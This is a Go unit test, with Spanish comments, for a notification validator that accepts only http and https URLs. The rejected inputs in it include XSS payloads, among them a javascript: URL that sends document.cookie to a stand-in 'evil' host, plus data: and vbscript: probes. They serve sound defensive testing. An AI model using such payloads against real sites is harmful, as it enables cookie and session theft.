// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Daniel Delgado Ramos

package domain

import "testing"

// TestNewNotificationURLScheme fija la verja de esquema de URL: el shell abre la
// notificación con window.location.assign, así que solo se admite http/https —
// javascript:/data: (XSS) y otros esquemas se rechazan.
func TestNewNotificationURLScheme(t *testing.T) {
	base := func(u string) NewNotification {
		return NewNotification{Subject: "sub", Source: SourceDrive, Type: "shared", Title: "t", URL: u}
	}
	ok := []string{"", "https://mail.sytue.eu/x", "http://localhost:3000/a?b=1", "https://x/#frag"}
	for _, u := range ok {
		n := base(u)
		if err := n.Validate(); err != nil {
			t.Errorf("URL válida rechazada %q: %v", u, err)
		}
	}
	bad := []string{
		"javascript:fetch('//evil/?c='+document.cookie)",
		"JavaScript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:msgbox(1)",
		"ftp://x/y",
		"//evil.com",
		" \tjavascript:alert(1)", // se normaliza (trim) y sigue rechazándose
	}
	for _, u := range bad {
		n := base(u)
		if err := n.Validate(); err == nil {
			t.Errorf("URL peligrosa aceptada: %q", u)
		}
	}
}
